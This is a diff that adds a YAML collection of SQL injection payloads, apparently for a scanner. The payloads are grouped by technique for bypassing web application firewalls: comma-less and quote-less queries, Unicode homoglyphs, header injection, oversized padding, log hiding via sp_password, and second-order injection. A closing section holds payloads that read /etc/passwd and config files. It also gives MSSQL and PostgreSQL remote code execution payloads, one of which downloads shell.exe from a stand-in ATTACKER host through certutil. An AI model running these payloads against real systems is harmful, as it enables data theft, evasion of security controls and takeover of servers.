+# 14. NO-SPACE BRACKET TECHNIQUE (Research: andresr.de)
+# Wrap everything in parentheses to eliminate spaces entirely
+###############################################################################
+no_space_bracket:
+  - payload: "(SELECT(1))"
+    description: "Bracket technique — no spaces needed"
+    technique: "no_space_bracket"
+    tag: "classic"
+  - payload: "'AND(1)=(1)-- -"
+    description: "Bracket no-space true condition"
+    technique: "no_space_bracket"
+  - payload: "'AND(1)=(2)-- -"
+    description: "Bracket no-space false condition"
+    technique: "no_space_bracket"
+  - payload: "1'AND(ASCII(SUBSTRING((SELECT(database())),1,1))>64)-- -"
+    description: "Bracket blind extraction — no spaces"
+    technique: "no_space_bracket"
+    tag: "data_extraction"
+  - payload: "'AND(extractvalue(rand(),concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))))-- -"
+    description: "Bracket error-based — extract tables, no spaces"
+    technique: "no_space_bracket"
+    tag: "data_extraction"
+  - payload: "'UNION(SELECT(1),(2),(3))-- -"
+    description: "Bracket UNION — no spaces, no commas"
+    technique: "no_space_bracket"
+  - payload: "'AND(SLEEP(5))-- -"
+    description: "Bracket time-based — no spaces"
+    technique: "no_space_bracket"
+
+###############################################################################
+# 15. COMMA-LESS TECHNIQUES (Research: CVE-2025-4396, sqlmap commaless*)
+# Bypass WAFs that strip commas — use SUBSTR FROM/FOR, CASE WHEN, JOIN
+###############################################################################
+comma_less:
+  time_based_case_when:
+    - payload: "1*(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END)-- -"
+      description: "MySQL CASE WHEN time-based — no commas, lazy eval (no greedy SLEEP)"
+      technique: "case_when_time"
+      tag: "advanced"
+    - payload: "1*(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT @@version) FROM 1 FOR 1))>50) THEN SLEEP(5) ELSE 1 END)-- -"
+      description: "MySQL CASE WHEN conditional extraction — no commas"
+      technique: "case_when_time"
+      tag: "data_extraction"
+    - payload: "1*(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)-- -"
+      description: "PostgreSQL CASE WHEN time-based — no commas"
+      technique: "case_when_time"
+      tag: "advanced"
+    - payload: "IF (1=1) WAITFOR DELAY '0:0:5'"
+      description: "MSSQL IF time-based — no commas needed"
+      technique: "case_when_time"
+
+  substr_from_for:
+    - payload: "SUBSTR((SELECT @@version) FROM 1 FOR 1)"
+      description: "MySQL SUBSTR FROM/FOR — no commas"
+      technique: "comma_less_substr"
+    - payload: "SUBSTRING((SELECT @@version) FROM 1 FOR 1)"
+      description: "PostgreSQL SUBSTRING FROM/FOR — no commas"
+      technique: "comma_less_substr"
+    - payload: "' AND ASCII(SUBSTRING((SELECT database()) FROM 1 FOR 1))>64 -- -"
+      description: "Boolean extraction with SUBSTRING FROM/FOR — no commas"
+      technique: "comma_less_substr"
+      tag: "data_extraction"
+
+  no_comma_union:
+    - payload: "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c -- -"
+      description: "UNION without commas — JOIN technique"
+      technique: "no_comma_union"
+      tag: "classic"
+    - payload: "' UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 -- -"
+      description: "UNION without commas — multiple UNIONs technique"
+      technique: "no_comma_union"
+    - payload: "' UNION SELECT 1 FROM (SELECT 1)a UNION SELECT 2 FROM (SELECT 1)b -- -"
+      description: "UNION with subquery — no commas"
+      technique: "no_comma_union"
+
+  limit_offset:
+    - payload: "1' LIMIT 1 OFFSET 0 -- -"
+      description: "LIMIT without comma — OFFSET syntax"
+      technique: "no_comma_limit"
+    - payload: "1' LIMIT 1 OFFSET 1 -- -"
+      description: "LIMIT with OFFSET 1"
+      technique: "no_comma_limit"
+
+###############################################################################
+# 16. HOMOGLYPH UNICODE BYPASS (Research: sqlmap-tamper-collection homoglyph.py)
+# Replace ASCII letters with Unicode lookalikes
+###############################################################################
+homoglyph:
+  - payload: "' ΑND 1=1 -- -"  # Greek capital Alpha A
+    description: "Greek Alpha AND — Unicode homoglyph bypass"
+    technique: "unicode_homoglyph"
+    dbms: "Generic"
+  - payload: "' UΝΙON SELΕCT 1,2,3 -- -"  # Greek letters
+    description: "Greek homoglyph UNION SELECT"
+    technique: "unicode_homoglyph"
+  - payload: "' SΕLΕCT 1,2,3 -- -"
+    description: "Greek E homoglyph in SELECT"
+    technique: "unicode_homoglyph"
+  - payload: "' ΟR 1=1 -- -"  # Greek Omicron O
+    description: "Greek Omicron OR — homoglyph bypass"
+    technique: "unicode_homoglyph"
+
+###############################################################################
+# 17. NUMERIC OBFUSCATION (Research: sqlmap-tamper-collection, WAFBooster)
+# Use hex/floats/math/expressions to replace simple integers
+###############################################################################
+numeric_obfuscation:
+  hex_numbers:
+    - payload: "' AND 1=0x1 -- -"
+      description: "Hex number comparison"
+      technique: "hex_numeric"
+    - payload: "' AND 0x1=0x1 -- -"
+      description: "Hex = hex comparison"
+      technique: "hex_numeric"
+    - payload: "' UNION SELECT 0x1,0x2,0x3 -- -"
+      description: "Hex numbers in UNION"
+      technique: "hex_numeric"
+
+  float_numbers:
+    - payload: "' AND 1.0=1.0 -- -"
+      description: "Float comparison"
+      technique: "float_numeric"
+    - payload: "' AND 1e1=10 -- -"
+      description: "Scientific notation — 1e1 = 10"
+      technique: "scientific_numeric"
+    - payload: "' AND .1e1=1 -- -"
+      description: "Short scientific notation"
+      technique: "scientific_numeric"
+    - payload: "' AND 1.0E0=1 -- -"
+      description: "Explicit float"
+      technique: "float_numeric"
+
+  math_expressions:
+    - payload: "' AND 2-1=1 -- -"
+      description: "Subtraction as 1"
+      technique: "math_numeric"
+    - payload: "' AND 1*1=1 -- -"
+      description: "Multiplication as 1"
+      technique: "math_numeric"
+    - payload: "' AND 1/1=1 -- -"
+      description: "Division as 1"
+      technique: "math_numeric"
+    - payload: "' AND 1+0=1 -- -"
+      description: "Addition identity"
+      technique: "math_numeric"
+    - payload: "' AND 2-1=2-1 -- -"
+      description: "Expression both sides"
+      technique: "math_numeric"
+    - payload: "' UNION SELECT 2-1,3-1,4-1 -- -"
+      description: "Math expressions in UNION"
+      technique: "math_numeric"
+
+  greatest_least:
+    - payload: "' AND GREATEST(1,1)=1 -- -"
+      description: "GREATEST function as identity"
+      technique: "greatest_bypass"
+      tag: "advanced"
+    - payload: "' AND GREATEST(0,1)=1 -- -"
+      description: "GREATEST as comparison"
+      technique: "greatest_bypass"
+    - payload: "' AND LEAST(0,1)=0 -- -"
+      description: "LEAST function"
+      technique: "greatest_bypass"
+    - payload: "' AND 1=GREATEST(1,2-1) -- -"
+      description: "GREATEST with math inside"
+      technique: "greatest_bypass"
+
+###############################################################################
+# 18. LOGICAL OPERATOR SWAP (Research: sqlmap symboliclogical.py)
+# AND → &&, OR → ||, XOR, &, |
+###############################################################################
+logical_operator_swap:
+  and_swap:
+    - payload: "' && 1=1 -- -"
+      description: "&& instead of AND (MySQL)"
+      technique: "symbolic_and"
+      dbms: "MySQL"
+    - payload: "' %26%26 1=1 -- -"
+      description: "URL-encoded &&"
+      technique: "symbolic_and_url"
+    - payload: "' & 1=1 -- -"
+      description: "Single & (MySQL bitwise AND as boolean)"
+      technique: "symbolic_and"
+    - payload: "' AND-1=-1 -- -"
+      description: "AND with negative numbers"
+      technique: "operator_twist"
+
+  or_swap:
+    - payload: "' || 1=1 -- -"
+      description: "|| instead of OR (PostgreSQL/Oracle/SQLite/MySQL with PIPES)"
+      technique: "symbolic_or"
+      tag: "classic"
+    - payload: "' %7C%7C 1=1 -- -"
+      description: "URL-encoded ||"
+      technique: "symbolic_or_url"
+    - payload: "' | 1=1 -- -"
+      description: "Single | (bitwise OR)"
+      technique: "symbolic_or"
+
+  xor_swap:
+    - payload: "' XOR 1=1 -- -"
+      description: "XOR condition"
+      technique: "xor_operator"
+    - payload: "' XOR 1=0 -- -"
+      description: "XOR false condition"
+      technique: "xor_operator"
+    - payload: "' AND 1=1 XOR 1=0 -- -"
+      description: "Combined AND+XOR"
+      technique: "xor_operator"
+
+###############################################################################
+# 19. JSON-BASED SQLI WAF BYPASS (Research: Stiletto scanner, sqlmap json)
+# Prepend JSON operators to confuse WAF parsers
+###############################################################################
+json_bypass:
+  - payload: "' - -1' UNION SELECT 1,2,3 -- -"
+    description: "JSON minus operator prefix bypass"
+    technique: "json_prefix"
+  - payload: "' - 1' OR '1'='1' -- -"
+    description: "JSON dash-number prefix"
+    technique: "json_prefix"
+  - payload: "1' - 0' UNION SELECT 1,2,3 -- -"
+    description: "JSON subtraction expression prefix"
+    technique: "json_prefix"
+  - payload: "1' AND JSON_EXTRACT('{}','$') IS NOT NULL -- -"
+    description: "MySQL JSON function used in WHERE (bypasses keyword filters)"
+    technique: "json_function"
+    dbms: "MySQL"
+
+###############################################################################
+# 20. MULTI-BYTE / UNMAGICQUOTES BYPASS (Research: sqlmap unmagicquotes.py)
+# Use multi-byte character sequences to consume escape backslash
+###############################################################################
+multibyte_bypass:
+  - payload: "%bf%27 OR 1=1 -- -"
+    description: "Multi-byte %bf%27 consumes escape backslash — bypasses GPC/addslashes"
+    technique: "multibyte_escape"
+    tag: "classic"
+  - payload: "%bf%27 UNION SELECT 1,2,3 -- -"
+    description: "Multi-byte UNION"
+    technique: "multibyte_escape"
+  - payload: "%bf%27 AND 1=1 -- -"
+    description: "Multi-byte boolean"
+    technique: "multibyte_escape"
+  - payload: "%bf%27 OR '1'='1' -- -"
+    description: "Multi-byte auth bypass"
+    technique: "multibyte_escape"
+  - payload: "%bf%27 AND SLEEP(5) -- -"
+    description: "Multi-byte time-based"
+    technique: "multibyte_escape"
+
+###############################################################################
+# 21. HEADER-BASED INJECTION & IP BYPASS (Research: sqlmap xforwardedfor.py, varnish.py)
+# Inject SQL through HTTP headers + spoof IP to bypass IP-based WAFs
+###############################################################################
+header_injection:
+  x_forwarded_for:
+    - payload: "X-Forwarded-For: ' OR 1=1 -- -"
+      description: "SQLi via X-Forwarded-For header"
+      technique: "header_xff"
+      tag: "classic"
+    - payload: "X-Forwarded-For: ' AND SLEEP(5) -- -"
+      description: "Time-based via X-Forwarded-For"
+      technique: "header_xff"
+    - payload: "X-Forwarded-For: ' UNION SELECT 1,@@version,3 -- -"
+      description: "UNION via X-Forwarded-For"
+      technique: "header_xff"
+    - payload: "X-Forwarded-For: 127.0.0.1' OR '1'='1"
+      description: "IP spoof + SQLi combined"
+      technique: "header_xff"
+
+  x_real_ip:
+    - payload: "X-Real-IP: ' OR 1=1 -- -"
+      description: "SQLi via X-Real-IP"
+      technique: "header_xri"
+    - payload: "X-Real-IP: ' AND SLEEP(5) -- -"
+      description: "Time-based via X-Real-IP"
+      technique: "header_xri"
+
+  x_originating_ip:
+    - payload: "X-Originating-IP: ' OR 1=1 -- -"
+      description: "SQLi via X-Originating-IP (Varnish bypass)"
+      technique: "header_xoi"
+      tag: "advanced"
+
+  user_agent:
+    - payload: "User-Agent: Mozilla/5.0' OR 1=1 -- -"
+      description: "SQLi via User-Agent"
+      technique: "header_ua"
+    - payload: "User-Agent: ' UNION SELECT 1,@@version,3 -- -"
+      description: "UNION via User-Agent"
+      technique: "header_ua"
+
+  referer:
+    - payload: "Referer: https://other.com' OR 1=1 -- -"
+      description: "SQLi via Referer header"
+      technique: "header_ref"
+
+  cookie:
+    - payload: "Cookie: session=' OR '1'='1' -- -"
+      description: "SQLi via session cookie"
+      technique: "header_cookie"
+    - payload: "Cookie: user_id=1' AND 1=1 -- -"
+      description: "SQLi via user_id cookie"
+      technique: "header_cookie"
+
+###############################################################################
+# 22. 0e UNION / SCIENTIFIC NOTATION UNION (Research: sqlmap 0eunion.py)
+# Prefix UNION with 0e to bypass keyword filters
+###############################################################################
+zero_e_union:
+  - payload: "0eUNION SELECT 1,2,3 -- -"
+    description: "0e prefix UNION — bypasses UNION keyword filter"
+    technique: "0e_union"
+    tag: "advanced"
+  - payload: "0eUNION ALL SELECT 1,2,3 -- -"
+    description: "0e prefix UNION ALL"
+    technique: "0e_union"
+  - payload: "0.5eUNION SELECT 1,2,3 -- -"
+    description: "Float 0e UNION"
+    technique: "0e_union"
+  - payload: "-0eUNION SELECT 1,2,3 -- -"
+    description: "Negative 0e UNION"
+    technique: "0e_union"
+  - payload: "1e0UNION SELECT 1,2,3 -- -"
+    description: "1e0 prefix UNION"
+    technique: "0e_union"
+
+###############################################################################
+# 23. sp_password OBFUSCATION (Research: sqlmap sp_password.py)
+# Append sp_password to hide payload from MSSQL logs
+###############################################################################
+sp_password_obfuscation:
+  - payload: "' AND 1=1 -- sp_password"
+    description: "MSSQL sp_password — hides payload from DB logs"
+    technique: "sp_password"
+    dbms: "MSSQL"
+  - payload: "1' UNION SELECT 1,@@version,3 -- sp_password"
+    description: "MSSQL sp_password UNION"
+    technique: "sp_password"
+    dbms: "MSSQL"
+  - payload: "1'; EXEC xp_cmdshell 'whoami' -- sp_password"
+    description: "MSSQL sp_password RCE"
+    technique: "sp_password"
+    dbms: "MSSQL"
+    severity: "critical"
+
+###############################################################################
+# 24. TRIPLE SUBQUERY / NESTED SUBQUERY SLEEP (Research: HackTricks, TyrusRC/assay)
+# Use deeply nested subqueries to bypass WAF signatures
+###############################################################################
+triple_subquery:
+  - payload: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))y) -- -"
+    description: "MySQL triple subquery SLEEP — bypasses simple SLEEP detection"
+    technique: "triple_subquery"
+    dbms: "MySQL"
+    tag: "advanced"
+  - payload: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1"
+    description: "MySQL triple subquery with trailing condition"
+    technique: "triple_subquery"
+    dbms: "MySQL"
+  - payload: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
+    description: "MySQL triple subquery with dash comment"
+    technique: "triple_subquery"
+    dbms: "MySQL"
+  - payload: "1' AND (SELECT * FROM (SELECT(BENCHMARK(5000000,MD5('x'))))a)-- -"
+    description: "MySQL triple subquery BENCHMARK"
+    technique: "triple_subquery"
+    dbms: "MySQL"
+
+###############################################################################
+# 25. NO-QUOTES / QUOTE-LESS TECHNIQUES (Research: PayloadsAllTheThings, Invicti)
+# Use CHAR(), CONCAT(), 0xHEX to avoid quote characters entirely
+###############################################################################
+no_quotes:
+  hex_string:
+    - payload: "' UNION SELECT 1,0x7573657273,3 -- -"
+      description: "Table name in hex (0x7573657273 = 'users')"
+      technique: "hex_string"
+    - payload: "' UNION SELECT 1,0x61646D696E,3 -- -"
+      description: "0x61646D696E = 'admin'"
+      technique: "hex_string"
+    - payload: "' AND password=0x68617368 -- -"
+      description: "Password comparison via hex"
+      technique: "hex_string"
+
+  char_function:
+    - payload: "' UNION SELECT 1,CHAR(117,115,101,114,115),3 -- -"
+      description: "CHAR() function — builds 'users' without quotes"
+      technique: "char_build"
+      tag: "classic"
+    - payload: "' UNION SELECT 1,CHAR(97,100,109,105,110),3 -- -"
+      description: "CHAR() — builds 'admin' without quotes"
+      technique: "char_build"
+    - payload: "' AND 1=(CHAR(49,32,61,32,49)) -- -"
+      description: "CHAR() — builds '1 = 1' condition"
+      technique: "char_build"
+    - payload: "' AND table_name LIKE CHAR(37,117,115,101,114,115,37) -- -"
+      description: "CHAR() — builds '%users%' LIKE pattern"
+      technique: "char_build"
+
+  concat_no_quotes:
+    - payload: "' UNION SELECT 1,CONCAT(CHAR(85),CHAR(83),CHAR(69),CHAR(82),CHAR(83)),3 -- -"
+      description: "CONCAT(CHAR()) — builds 'USERS' without quotes"
+      technique: "concat_char"
+    - payload: "' AND 1=(CONCAT(CHAR(49),CHAR(32),CHAR(61),CHAR(32),CHAR(49))) -- -"
+      description: "CONCAT(CHAR()) — builds expression"
+      technique: "concat_char"
+
+###############################################################################
+# 26. FUNCTION ALTERNATIVES BYPASS (Research: OWASP, Codex)
+# Replace blocked SQL functions with equivalents
+###############################################################################
+function_alternatives:
+  concat:
+    - payload: "' UNION SELECT 1,CONCAT_WS(0x3a,username,password),3 FROM users -- -"
+      description: "CONCAT_WS instead of CONCAT — with separator"
+      technique: "func_alt_concat"
+    - payload: "' UNION SELECT 1,username||0x3a||password,3 FROM users -- -"
+      description: "|| concatenation instead of CONCAT (PostgreSQL/Oracle)"
+      technique: "func_alt_concat"
+      dbms: "PostgreSQL/Oracle"
+
+  substring:
+    - payload: "' AND MID((SELECT @@version),1,1)='5' -- -"
+      description: "MID() instead of SUBSTRING()"
+      technique: "func_alt_substr"
+    - payload: "' AND LEFT((SELECT @@version),1)='5' -- -"
+      description: "LEFT() instead of SUBSTRING()"
+      technique: "func_alt_substr"
+    - payload: "' AND RIGHT((SELECT @@version),1)='5' -- -"
+      description: "RIGHT() instead of SUBSTRING()"
+      technique: "func_alt_substr"
+    - payload: "' AND LPAD((SELECT @@version),1,'x')='5' -- -"
+      description: "LPAD() trick — extract first char"
+      technique: "func_alt_substr"
+
+  if_case:
+    - payload: "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END -- -"
+      description: "CASE WHEN instead of IF() — avoids commas too"
+      technique: "func_alt_if"
+      tag: "advanced"
+    - payload: "' AND IFNULL(1,0)=1 -- -"
+      description: "IFNULL instead of IF"
+      technique: "func_alt_if"
+    - payload: "' AND NULLIF(1,1) IS NULL -- -"
+      description: "NULLIF instead of comparison"
+      technique: "func_alt_if"
+
+  version_info:
+    - payload: "' AND @@version LIKE '%5.%' -- -"
+      description: "@@version instead of VERSION() function"
+      technique: "func_alt_version"
+    - payload: "' AND schema()=database() -- -"
+      description: "SCHEMA() instead of DATABASE()"
+      technique: "func_alt_version"
+
+  sleep_benchmark:
+    - payload: "' AND BENCHMARK(10000000,MD5(NOW())) -- -"
+      description: "BENCHMARK instead of SLEEP (MySQL heavy query)"
+      technique: "func_alt_sleep"
+      tag: "advanced"
+    - payload: "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B) -- -"
+      description: "Heavy cartesian join instead of SLEEP"
+      technique: "func_alt_sleep"
+    - payload: "' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) -- -"
+      description: "PostgreSQL GENERATE_SERIES heavy query"
+      technique: "func_alt_sleep"
+      dbms: "PostgreSQL"
+
+###############################################################################
+# 27. CHARSET/ENCODING BYPASS (Research: Stiletto, IBM037 charset, WAFFLED)
+# Use alternative character encodings to bypass WAF parsers
+###############################################################################
+charset_bypass:
+  ibm037:
+    - payload: "IBM037-encoded SQL via Content-Type: charset=ibm037"
+    description: "EBCDIC IBM037 charset — most WAFs don't decode EBCDIC"
+    technique: "ebcdic_bypass"
+    tag: "advanced"
+  overlong_utf8:
+    - payload: "%C0%A7' OR 1=1 -- -"
+      description: "Overlong UTF-8 encoding for quote — WAF doesn't decode"
+      technique: "overlong_utf8"
+    - payload: "%C0%AE OR 1=1 -- -"
+      description: "Overlong UTF-8 dot"
+      technique: "overlong_utf8"
+  chunked_transfer:
+    - payload: "Transfer-Encoding: chunked (split payload across chunks)"
+      description: "Chunked transfer encoding — WAF inspects first chunk only"
+      technique: "chunked_bypass"
+      tag: "advanced"
+
+###############################################################################
+# 28. PAD TO SIZE / BUFFER OVERFLOW (Research: OWASP, sqlmap-tamper-collection)
+# Pad payload to specific sizes to trigger WAF buffer limits
+###############################################################################
+size_bypass:
+  pad_to_8kb:
+    - payload: "' OR 1=1 -- " + "A"*8000 + " -- -"
+      description: "Pad to 8KB — overflow WAF buffer, WAF stops inspecting"
+      technique: "size_overflow"
+      tag: "advanced"
+    - payload: "' UNION SELECT 1,2,3 " + "A"*8000 + " -- -"
+      description: "Pad UNION payload to 8KB"
+      technique: "size_overflow"
+
+###############################################################################
+# 29. ASTERISK/REPLACE EXPLOIT (Research: OWASP WAF bypass section 3)
+# If WAF replaces * with space, inject * within keywords
+###############################################################################
+asterisk_bypass:
+  - payload: "' UN*ION SEL*ECT 1,2,3 -- -"
+    description: "Asterisk inside keywords — if WAF replaces * with space, becomes valid SQL"
+    technique: "asterisk_replace"
+    tag: "advanced"
+  - payload: "' UN*ION*ALL SEL*ECT 1,2,3 -- -"
+    description: "Asterisk UNION ALL"
+    technique: "asterisk_replace"
+  - payload: "' AN*D 1=1 -- -"
+    description: "Asterisk AND"
+    technique: "asterisk_replace"
+
+###############################################################################
+# 30. PARTIAL WORD / TRUNCATION MATCH (Research: HackTricks)
+# Use partial keyword that becomes complete after WAF processing
+###############################################################################
+partial_word:
+  - payload: "' UNIOUNIONN SELESELECTCT 1,2,3 -- -"
+    description: "Partial word duplication — WAF removes inner UNION, leaving valid SQL"
+    technique: "partial_word"
+    tag: "classic"
+  - payload: "' ANANDD 1=1 -- -"
+    description: "Partial AND duplication"
+    technique: "partial_word"
+  - payload: "' OROR 1=1 -- -"
+    description: "Partial OR duplication"
+    technique: "partial_word"
+  - payload: "' WHWHEREERE 1=1 -- -"
+    description: "Partial WHERE duplication"
+    technique: "partial_word"
+
+###############################################################################
+# 31. SECOND-ORDER TIME-BASED via STORED XSS-like SQLi (Research: 60 reports)
+# Store payload in profile/registration, trigger on admin view
+###############################################################################
+second_order_time:
+  - storage_payload: "admin' AND SLEEP(5) -- -"
+    trigger_endpoint: "admin/user/profile"
+    description: "Second-order time-based — store in username, trigger on admin view"
+    technique: "second_order_sleep"
+    severity: "high"
+  - storage_payload: "admin' AND BENCHMARK(5000000,MD5('x')) -- -"
+    trigger_endpoint: "admin/user/profile"
+    description: "Second-order heavy query — stored in profile field"
+    technique: "second_order_benchmark"
+    severity: "high"
+
+###############################################################################
+# 32. POLYGLOT INJECTION
+###############################################################################
+polyglot:
+  - payload: "SLEEP(1) /*' or SLEEP(1) or \" or SLEEP(1) or \"*/"
+    description: "Polyglot — works in multiple contexts"
+    technique: "polyglot"
+  - payload: "'/*' UNION SELECT /*!1,2,3*/-- -"
+    description: "Polyglot — mixed comment styles"
+    technique: "polyglot"
+
+###############################################################################
+# 15. DBMS-SPECIFIC ADVANCED
+###############################################################################
+advanced:
+  mysql_infile:
+    - payload: "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 -- -"
+      description: "MySQL read /etc/passwd"
+      technique: "file_read"
+      severity: "high"
+    - payload: "' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3 -- -"
+      description: "MySQL read config file"
+      technique: "file_read"
+      severity: "critical"
+
+  mssql_ole:
+    - payload: "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; -- -"
+      description: "MSSQL enable OLE automation"
+      technique: "ole_enable"
+      severity: "critical"
+    - payload: "'; DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUTPUT; EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\\pwned.txt'; -- -"
+      description: "MSSQL RCE via OLE automation"
+      technique: "ole_rce"
+      severity: "critical"
+    - payload: "'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://ATTACKER/shell.exe C:\\shell.exe' -- -"
+      description: "MSSQL download file via certutil"
+      technique: "file_download"
+      severity: "critical"
+
+  postgresql_lo:
+    - payload: "'; SELECT lo_import('/etc/passwd'); SELECT lo_get(oid) FROM pg_largeobject LIMIT 1; -- -"
+      description: "PostgreSQL large object read"
+      technique: "file_read"
+      severity: "high"
+    - payload: "'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(data text); COPY cmd_exec FROM PROGRAM 'whoami'; SELECT * FROM cmd_exec; -- -"
+      description: "PostgreSQL RCE via COPY PROGRAM"
+      technique: "rce"
+      severity: "critical"
